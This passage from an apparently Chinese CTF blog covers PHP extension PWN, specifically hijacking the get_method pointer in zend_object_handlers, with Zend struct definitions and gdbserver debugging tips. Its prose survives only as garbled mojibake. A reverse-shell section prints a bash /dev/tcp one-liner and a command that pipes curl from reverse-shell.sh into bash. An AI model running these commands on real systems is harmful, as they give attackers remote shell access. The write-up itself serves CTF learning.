          <a href="#2-åŠ«æŒget-methodå‡½æ•°æŒ‡é’ˆ" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-åŠ«æŒget-methodå‡½æ•°æŒ‡é’ˆ" class="headerlink" title="(2)åŠ«æŒget_methodå‡½æ•°æŒ‡é’ˆ"></a>(2)åŠ«æŒget_methodå‡½æ•°æŒ‡é’ˆ</h3>
      <p>ç®€å•æ¥è¯´ï¼Œå°±æ˜¯åŠ«æŒå‡½æ•°æŒ‡é’ˆ<code>zend_object-&gt;zval-&gt;zend_object_handlers-&gt;get_method</code></p>

        <h4 id="åŸç†å¦‚ä¸‹ï¼š"   >
          <a href="#åŸç†å¦‚ä¸‹ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#åŸç†å¦‚ä¸‹ï¼š" class="headerlink" title="åŸç†å¦‚ä¸‹ï¼š"></a>åŸç†å¦‚ä¸‹ï¼š</h4>
      
        <h5 id="â‘ zend-object"   >
          <a href="#â‘ zend-object" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ zend-object" class="headerlink" title="â‘ zend_object"></a>â‘ zend_object</h5>
      <p>å½“å®šä¹‰å£°æ˜ä¸€ä¸ªclasså¯¹è±¡æ—¶</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class Lucky&#123;</span><br><span class="line">	public    $a0, $a1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$lucky = new Lucky();</span><br><span class="line">$lucky-&gt;a1 = function ($x) &#123; &#125;;</span><br></pre></td></tr></table></div></figure>

<p>å½“åœ¨phpä¸­å£°æ˜Luckyè¿™ä¸ªclasså¯¹è±¡æ—¶ï¼Œä¼šè‡ªåŠ¨å£°æ˜ä¸€ä¸ªå¯¹åº”å¤§å°<code>zend_object</code>ç»“æ„</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//7.3/src/Zend/zend_types.h å¤§å°56</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_object</span> &#123;</span></span><br><span class="line">    zend_refcounted_h gc;</span><br><span class="line">    <span class="keyword">uint32_t</span>          handle; <span class="comment">// <span class="doctag">TODO:</span> may be removed ???</span></span><br><span class="line">    zend_class_entry *ce;</span><br><span class="line">    <span class="keyword">const</span> zend_object_handlers *handlers;</span><br><span class="line">    HashTable        *properties;</span><br><span class="line">    zval              properties_table[<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>æ­£å¸¸æ¥è¯´ï¼Œåˆ›å»ºclasså¯¹è±¡éƒ½ä¼šæœ‰æˆå‘˜ï¼Œä½†æ˜¯åœ¨phpä¸­å…¶å®ä¹Ÿå¯ä»¥å£°æ˜æ²¡æœ‰æˆå‘˜çš„classå¯¹è±¡ï¼Œé‚£ä¹ˆæ­¤æ—¶è¯¥classå¯¹åº”çš„<code>zend_object</code>çš„å¤§å°å³ä¸º56-8=48ã€‚æ‰€ä»¥classå¯¹è±¡ä¸­çš„æˆå‘˜è¶Šå¤šï¼Œå…¶<code>zend_object</code>ç»“æ„çš„å¤§å°å°±è¶Šå¤§ã€‚</p>

        <h5 id="â‘¡zval"   >
          <a href="#â‘¡zval" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡zval" class="headerlink" title="â‘¡zval"></a>â‘¡zval</h5>
      <p>è€Œæ¯ä¸€ä¸ªæˆå‘˜åœ¨å†…å­˜ä¸­å®é™…ååº”çš„å°±æ˜¯<code>zval</code>ç»“æ„ä½“</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//7.3/src/Zend/zend_types.h  å¤§å°0x10</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zval_struct</span> &#123;</span></span><br><span class="line">	zend_value        value;			<span class="comment">/* value */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			ZEND_ENDIAN_LOHI_3(</span><br><span class="line">				zend_uchar    type,			<span class="comment">/* active type */</span></span><br><span class="line">				zend_uchar    type_flags,</span><br><span class="line">				<span class="keyword">union</span> &#123;</span><br><span class="line">					<span class="keyword">uint16_t</span>  call_info;    <span class="comment">/* call info for EX(This) */</span></span><br><span class="line">					<span class="keyword">uint16_t</span>  extra;        <span class="comment">/* not further specified */</span></span><br><span class="line">				&#125; u)</span><br><span class="line">		&#125; v;</span><br><span class="line">		<span class="keyword">uint32_t</span> type_info;</span><br><span class="line">	&#125; u1;</span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="keyword">uint32_t</span>     next;                 <span class="comment">/* hash collision chain */</span></span><br><span class="line">		<span class="keyword">uint32_t</span>     cache_slot;           <span class="comment">/* cache slot (for RECV_INIT) */</span></span><br><span class="line">		<span class="keyword">uint32_t</span>     opline_num;           <span class="comment">/* opline number (for FAST_CALL) */</span></span><br><span class="line">		<span class="keyword">uint32_t</span>     lineno;               <span class="comment">/* line number (for ast nodes) */</span></span><br><span class="line">		<span class="keyword">uint32_t</span>     num_args;             <span class="comment">/* arguments number for EX(This) */</span></span><br><span class="line">		<span class="keyword">uint32_t</span>     fe_pos;               <span class="comment">/* foreach position */</span></span><br><span class="line">		<span class="keyword">uint32_t</span>     fe_iter_idx;          <span class="comment">/* foreach iterator index */</span></span><br><span class="line">		<span class="keyword">uint32_t</span>     access_flags;         <span class="comment">/* class constant access flags */</span></span><br><span class="line">		<span class="keyword">uint32_t</span>     property_guard;       <span class="comment">/* single property guard */</span></span><br><span class="line">		<span class="keyword">uint32_t</span>     constant_flags;       <span class="comment">/* constant flags */</span></span><br><span class="line">		<span class="keyword">uint32_t</span>     extra;                <span class="comment">/* not further specified */</span></span><br><span class="line">	&#125; u2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>æ‰€ä»¥classå¯¹è±¡çš„<code>zend_object</code>ç»“æ„çš„å¤§å°å…¬å¼ä¸º</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">48 + amount_of_member*0x10</span><br></pre></td></tr></table></div></figure>

<p>æ¯”å¦‚ä¸Šè¿°çš„luckyå¯¹è±¡çš„<code>zend_object</code>ç»“æ„çš„å¤§å°å³ä¸º<code>48+0x10*2=0x50</code></p>

        <h5 id="â‘¢zend-object-handlers"   >
          <a href="#â‘¢zend-object-handlers" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¢zend-object-handlers" class="headerlink" title="â‘¢zend_object_handlers"></a>â‘¢zend_object_handlers</h5>
      <p>è€Œæ¯ä¸ªzvalç»“æ„ä½“ä¸­çš„valueå€¼æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼Œå½“è¯¥æˆå‘˜ä¸ºå­—ç¬¦ä¸²æ—¶ï¼Œé‚£ä¹ˆå…¶ä¸ºä¸€ä¸ª<code>zend_string</code>ç»“æ„ä½“æŒ‡é’ˆ</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//7.3/src/Zend/zend_types.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_string</span> &#123;</span></span><br><span class="line">	zend_refcounted_h gc;</span><br><span class="line">	zend_ulong        h;                <span class="comment">/* hash value */</span></span><br><span class="line">	<span class="keyword">size_t</span>            len;</span><br><span class="line">	<span class="keyword">char</span>              val[<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>å½“è¯¥æˆå‘˜ä¸ºå‡½æ•°æ—¶ï¼Œå…¶ä¸ºä¸€ä¸ª<code>zend_object_handlers</code>æŒ‡é’ˆ</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//7.3/src/Zend/zend_object_handlers.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_object_handlers</span> &#123;</span></span><br><span class="line">	<span class="comment">/* offset of real object header (usually zero) */</span></span><br><span class="line">	<span class="keyword">int</span>										offset;</span><br><span class="line">	<span class="comment">/* general object functions */</span></span><br><span class="line">	<span class="keyword">zend_object_free_obj_t</span>					free_obj;</span><br><span class="line">	<span class="keyword">zend_object_dtor_obj_t</span>					dtor_obj;</span><br><span class="line">	<span class="keyword">zend_object_clone_obj_t</span>					clone_obj;</span><br><span class="line">	<span class="comment">/* individual object functions */</span></span><br><span class="line">	<span class="keyword">zend_object_read_property_t</span>				read_property;</span><br><span class="line">	<span class="keyword">zend_object_write_property_t</span>			write_property;</span><br><span class="line">	<span class="keyword">zend_object_read_dimension_t</span>			read_dimension;</span><br><span class="line">	<span class="keyword">zend_object_write_dimension_t</span>			write_dimension;</span><br><span class="line">	<span class="keyword">zend_object_get_property_ptr_ptr_t</span>		get_property_ptr_ptr;</span><br><span class="line">	<span class="keyword">zend_object_get_t</span>						get;</span><br><span class="line">	<span class="keyword">zend_object_set_t</span>						<span class="built_in">set</span>;</span><br><span class="line">	<span class="keyword">zend_object_has_property_t</span>				has_property;</span><br><span class="line">	<span class="keyword">zend_object_unset_property_t</span>			unset_property;</span><br><span class="line">	<span class="keyword">zend_object_has_dimension_t</span>				has_dimension;</span><br><span class="line">	<span class="keyword">zend_object_unset_dimension_t</span>			unset_dimension;</span><br><span class="line">	<span class="keyword">zend_object_get_properties_t</span>			get_properties;</span><br><span class="line">	<span class="keyword">zend_object_get_method_t</span>				get_method;</span><br><span class="line">	<span class="keyword">zend_object_call_method_t</span>				call_method;</span><br><span class="line">	<span class="keyword">zend_object_get_constructor_t</span>			get_constructor;</span><br><span class="line">	<span class="keyword">zend_object_get_class_name_t</span>			get_class_name;</span><br><span class="line">	<span class="keyword">zend_object_compare_t</span>					compare_objects;</span><br><span class="line">	<span class="keyword">zend_object_cast_t</span>						cast_object;</span><br><span class="line">	<span class="keyword">zend_object_count_elements_t</span>			count_elements;</span><br><span class="line">	<span class="keyword">zend_object_get_debug_info_t</span>			get_debug_info;</span><br><span class="line">	<span class="keyword">zend_object_get_closure_t</span>				get_closure;</span><br><span class="line">	<span class="keyword">zend_object_get_gc_t</span>					get_gc;</span><br><span class="line">	<span class="keyword">zend_object_do_operation_t</span>				do_operation;</span><br><span class="line">	<span class="keyword">zend_object_compare_zvals_t</span>				compare;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>åŒæ ·çš„ï¼Œä¹Ÿå¯¹åº”æœ‰å…¶ä»–çš„å˜é‡ç±»å‹ï¼Œç”±zvalä¸­çš„typeæ¥å†³å®šï¼Œtypeå€¼çš„ä¸åŒä»£è¡¨ä¸åŒçš„ç±»å‹ï¼Œæ¯”å¦‚stringä¸º6ï¼Œå‡½æ•°objectä¸º8</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//src/Zend/zend_types.h</span></span><br><span class="line"><span class="comment">/* regular data types */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_UNDEF					0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_NULL						1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_FALSE					2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_TRUE						3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_LONG						4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_DOUBLE					5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_STRING					6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_ARRAY					7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_OBJECT					8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_RESOURCE					9</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_REFERENCE				10</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* constant expressions */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_CONSTANT_AST				11</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* internal types */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_INDIRECT             	13</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_PTR						14</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IS_ERROR					15</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* fake types used only for type hinting (Z_TYPE(zv) can not use them) */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IS_BOOL					16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_CALLABLE					17</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_ITERABLE					18</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_VOID						19</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IS_NUMBER					20</span></span><br></pre></td></tr></table></div></figure>

<p>æ±‡æ€»ä¸€ä¸‹ï¼Œå°±æ˜¯åˆ›å»ºä¸€ä¸ªclassç±»ï¼Œç„¶ååŠ«æŒå…¶å‡½æ•°æˆå‘˜åˆ›å»ºçš„<code>zval</code>ç»“æ„ä½“ä¸­çš„<code>zend_object_handlers</code>æŒ‡é’ˆï¼Œä½¿å…¶æŒ‡å‘æˆ‘ä»¬å¯æ§çš„åŒºåŸŸï¼Œç„¶ååœ¨å¯¹åº”åç§»å¤„ä¿®æ”¹<code>get_method</code>æŒ‡é’ˆï¼Œä½¿å…¶æŒ‡å‘å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ï¼Œä»è€Œæ¥åå¼¹shellã€‚</p>
<p>æˆ–è€…è¯´ç›´æ¥åŠ«æŒå‡½æ•°æˆå‘˜åˆ›å»ºçš„<code>zval</code>ç»“æ„ä½“ä¸­çš„<code>zend_object_handlers</code>æŒ‡å‘çš„å†…å­˜åŒºåŸŸä¸­çš„<code>get_method</code>æŒ‡é’ˆï¼Œä¹Ÿæ˜¯èƒ½èµ·åˆ°ä¸€æ ·çš„ä½œç”¨ã€‚</p>

        <h4 id="ç»•è¿‡ç‚¹"   >
          <a href="#ç»•è¿‡ç‚¹" class="heading-link"><i class="fas fa-link"></i></a><a href="#ç»•è¿‡ç‚¹" class="headerlink" title="ç»•è¿‡ç‚¹"></a>ç»•è¿‡ç‚¹</h4>
      <p>ä¸è¿‡è¿˜æ˜¯éœ€è¦ç»•è¿‡ä¸€äº›ä¿æŠ¤çš„ï¼Œè°ƒç”¨<code>get_method</code>å‡½æ•°æŒ‡é’ˆè²Œä¼¼è¿˜æ˜¯éœ€è¦ç»•è¿‡ä¸€äº›ä¸œè¥¿çš„ï¼Œè¿™é‡Œä¸çŸ¥é“å…·ä½“çš„åŸç†ï¼Œä¸è¿‡ä¿®æ”¹ç‚¹è¿˜æ˜¯å¯ä»¥è¯´æ˜çš„</p>

        <h5 id="â‘ write-dimension"   >
          <a href="#â‘ write-dimension" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ write-dimension" class="headerlink" title="â‘ write_dimension"></a>â‘ write_dimension</h5>
      <p>è¿™ä¸ªéœ€è¦ä¿®æ”¹çš„ï¼Œå¸¸è§çš„å¦‚ä¸‹ï¼Œéœ€è¦ä¿®æ”¹æœ€ä½çš„ä¸º0x1</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202161908211.png" alt="image-20220216190812859"></p>
<p>ç›¸å¯¹åº”çš„ä¿®æ”¹å¦‚ä¸‹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202161909956.png" alt="image-20220216190925728"></p>
<p>ç›¸å…³æ£€æµ‹çš„ä»£ç å¦‚ä¸‹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202161941846.png" alt="image-20220216194142467"></p>

        <h5 id="â‘¡get-methodçš„é€‰æ‹©"   >
          <a href="#â‘¡get-methodçš„é€‰æ‹©" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡get-methodçš„é€‰æ‹©" class="headerlink" title="â‘¡get_methodçš„é€‰æ‹©"></a>â‘¡get_methodçš„é€‰æ‹©</h5>
      <p>ç”±äºè°ƒç”¨è¯¥å‡½æ•°æŒ‡é’ˆæ—¶ï¼Œä¼ è¿›æ¥çš„rdiå‚æ•°å¹¶éæ˜¯æˆ‘ä»¬çš„Cè¯­è¨€ä¸Šçš„å­—ç¬¦ä¸²ç±»å‹çš„æŒ‡é’ˆï¼Œè€Œè²Œä¼¼æ˜¯ä¸€ä¸ªç±»ä¼¼<code>zend_string</code>çš„æŒ‡é’ˆï¼Œç±»ä¼¼å¦‚ä¸‹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202161930594.png" alt="image-20220216193001312"></p>
<p>æ‰€ä»¥ä¸èƒ½ä½¿ç”¨å¸¸è§„æ„ä¹‰<code>system</code>æˆ–è€…<code>popen</code>å‡½æ•°ç­‰ï¼Œéœ€è¦è°ƒç”¨phpä¸­çš„ç›¸å…³å†…ç½®çš„å‡½æ•°æ¥å¯¹å‚æ•°è¿›è¡Œè§£æå†æ‰§è¡Œã€‚ä¸€èˆ¬é€‰æ‹©çš„æ˜¯phpç¨‹åºä¸­çš„<code>php_exec</code>å‡½æ•°ä¸‹é¢çš„å‡½æ•°ä»£ç ï¼Œä¸‹å›¾çº¢æ¡†æ‰€ç¤º</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202161914467.png" alt="image-20220216191438382"></p>
<p>åŒæ ·çš„ï¼Œä»¥ä¸Šçš„ç»“æ„ä½“åœ¨å †ä¸­é€šå¸¸ä¹Ÿå¯ä»¥ç”¨æ¥æ³„éœ²åœ°å€</p>
<p>ä¾‹é¢˜å°±æ˜¯2021WMCTF checkin</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/253189#h2-4" >2021WMCTF_checkinå­¦ä¹ PHP PWN - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://hackmd.io/@ZzDmROodQUynQsF9je3Q5Q/Sy7hS9bBS?type=view" >PHP pwnå…¥é—¨1 - æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ - HackMD</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="å››ã€åå¼¹shell"   >
          <a href="#å››ã€åå¼¹shell" class="heading-link"><i class="fas fa-link"></i></a><a href="#å››ã€åå¼¹shell" class="headerlink" title="å››ã€åå¼¹shell"></a>å››ã€åå¼¹shell</h1>
      <p>å¸¸è§çš„åå¼¹shellå¤§æ¦‚ä»¥ä¸‹ä¸¤ç§æ–¹å¼</p>

        <h2 id="1-popenç›´æ¥åå¼¹"   >
          <a href="#1-popenç›´æ¥åå¼¹" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-popenç›´æ¥åå¼¹" class="headerlink" title="1.popenç›´æ¥åå¼¹"></a>1.popenç›´æ¥åå¼¹</h2>
      <p>è¿™ä¸ªåªéœ€è¦æ‰§è¡Œå‘½ä»¤ï¼Œå…¶ä¸­<code>127.0.0.1/6666</code>å³è®¾ç½®ä¸ºè‡ªå·±æ”»å‡»æœºçš„ipå’Œç«¯å£</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">popen(<span class="string">&#x27;/bin/bash -c &quot;/bin/bash -i &gt;&amp;/dev/tcp/127.0.0.1/6666 0&gt;&amp;1&quot;&#x27;</span>);</span><br></pre></td></tr></table></div></figure>

<p>å¸¸è§systemå‡½æ•°ä¸å¥½ä½¿ç”¨ï¼Œphpä¸­ä¸å¥½æ•´çš„æ—¶å€™</p>

        <h2 id="2-ä½¿ç”¨ä¸­è½¬ç«™åå¼¹"   >
          <a href="#2-ä½¿ç”¨ä¸­è½¬ç«™åå¼¹" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-ä½¿ç”¨ä¸­è½¬ç«™åå¼¹" class="headerlink" title="2.ä½¿ç”¨ä¸­è½¬ç«™åå¼¹"></a>2.ä½¿ç”¨ä¸­è½¬ç«™åå¼¹</h2>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/lukechilds/reverse-shell" >GitHub - lukechilds/reverse-shell: Reverse Shell as a Service</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>æ‰§è¡Œå‘½ä»¤ï¼Œå…¶ä¸­<code>192.168.0.69:1337</code>ä¹Ÿæ˜¯è®¾ç½®ä¸ºè‡ªå·±æ”»å‡»æœºçš„ipå’Œç«¯å£</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(&quot;curl https://reverse-shell.sh/192.168.0.69:1337|bash\x00&quot;);</span><br></pre></td></tr></table></div></figure>

<p>ç›¸å½“äºåœ¨ä¸€ä¸ªæœåŠ¡å™¨<code>https://reverse-shell.sh</code>è¿›è¡Œä¸­è½¬</p>

        <h1 id="äº”ã€è°ƒè¯•æŠ€å·§"   >
          <a href="#äº”ã€è°ƒè¯•æŠ€å·§" class="heading-link"><i class="fas fa-link"></i></a><a href="#äº”ã€è°ƒè¯•æŠ€å·§" class="headerlink" title="äº”ã€è°ƒè¯•æŠ€å·§"></a>äº”ã€è°ƒè¯•æŠ€å·§</h1>
      
        <h2 id="1-å®‰è£…å¯¹åº”ç‰ˆæœ¬è°ƒè¯•"   >
          <a href="#1-å®‰è£…å¯¹åº”ç‰ˆæœ¬è°ƒè¯•" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å®‰è£…å¯¹åº”ç‰ˆæœ¬è°ƒè¯•" class="headerlink" title="1.å®‰è£…å¯¹åº”ç‰ˆæœ¬è°ƒè¯•"></a>1.å®‰è£…å¯¹åº”ç‰ˆæœ¬è°ƒè¯•</h2>
      <p>è¿™ä¸ªå°±ä¸å¤šè¯´äº†ï¼Œåœ¨åšé¢˜çš„æ—¶å€™ï¼Œäº†è§£åˆ°phpç‰ˆæœ¬ï¼Œç„¶åæœ¬æœºå®‰è£…å¯¹åº”ç‰ˆæœ¬çš„phpï¼Œä¹‹ååœ¨php.iniä¸­æ·»åŠ è¯¥æ¨¡å—è°ƒè¯•å³å¯</p>

        <h2 id="2-gdbserverè°ƒè¯•"   >
          <a href="#2-gdbserverè°ƒè¯•" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-gdbserverè°ƒè¯•" class="headerlink" title="2.gdbserverè°ƒè¯•"></a>2.gdbserverè°ƒè¯•</h2>
      <p>æœ‰äº›é¢˜ç›®ä¼šç»™ç°æˆçš„dockerç¯å¢ƒï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥åœ¨é‡Œé¢ä½¿ç”¨gdbserverè°ƒè¯•ï¼Œä½†æ˜¯æœ‰ç‚¹é—®é¢˜å°±æ˜¯ï¼Œè°ƒè¯•çš„æ—¶å€™å¥½åƒæ²¡åŠæ³•ä½¿ç”¨<code>run</code>å‘½ä»¤æ¥è¿è¡Œphpæ–‡ä»¶ï¼Œè€Œç›´æ¥è°ƒè¯•<code>php pwn.php</code>çš„è¯ï¼Œå¼€å§‹çš„æ—¶å€™ç›¸åº”çš„.soæ¨¡å—ä¸ä¼šè¢«åŠ è½½è¿›å…¥ï¼Œæ²¡åŠæ³•ä¸‹æ–­ç‚¹ã€‚</p>
<p>é‚£ä¹ˆå¯ä»¥å…ˆå°†æœ¬åœ°çš„ASLRå…³é—­ï¼Œè¿™æ ·dockerä¸­çš„ASLRä¹Ÿæ˜¯å…³é—­çŠ¶æ€</p>
<p>ç„¶å<code>gdbserver 127.0.0.1:6666 php</code>ï¼Œå®¿ä¸»æœº<code>target remote:6666;c</code>è¿œç¨‹åŠ è½½è¿è¡Œèµ·æ¥ï¼Œæ‰¾åˆ°å¯¹åº”<code>.so</code>æ¨¡å—çš„åŠ è½½åœ°å€<code>so_addr</code></p>
<p>ä¹‹åå†<code>gdbserver 127.0.0.1:6666 php pwn.php</code>ï¼Œå®¿ä¸»æœºè¿œç¨‹åŠ è½½ï¼Œä½¿ç”¨<code>add-symbol-file file.so so_addr</code>ä»è€ŒåŠ è½½è¿›ç¬¦å·è¡¨ï¼Œç„¶åå³å¯ä¸‹æ–­ç‚¹è°ƒè¯•äº†ã€‚</p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/02/09/%E8%A7%A3%E9%87%8A%E5%99%A8PWN/">è§£é‡Šå™¨PWN</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-02-09</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-02-09</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="å‰è¨€"   >
          <a href="#å‰è¨€" class="heading-link"><i class="fas fa-link"></i></a><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1>
      <p>è®°å½•ä¸€ä¸‹è§£é‡Šå™¨ç±»å‹çš„PWNé¢˜</p>
<p>å‚ç…§ï¼š<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/208940#h2-2" >è§£é‡Šå™¨ç±»å‹çš„Pwné¢˜ç›®æ€»ç»“ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="ä¸€ã€pwnable-bf"   >
          <a href="#ä¸€ã€pwnable-bf" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸€ã€pwnable-bf" class="headerlink" title="ä¸€ã€pwnable_bf"></a>ä¸€ã€pwnable_bf</h1>
      <p><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/Brainfuck"><code>brainfuck</code>è¯­è¨€</a>çš„è§£é‡Šå™¨ï¼Œå…¶ä¸­æŒ‡é’ˆpæŒ‡å‘bssæ®µä¸Šçš„tape</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202091059160.png" alt="image-20220209105933118"></p>
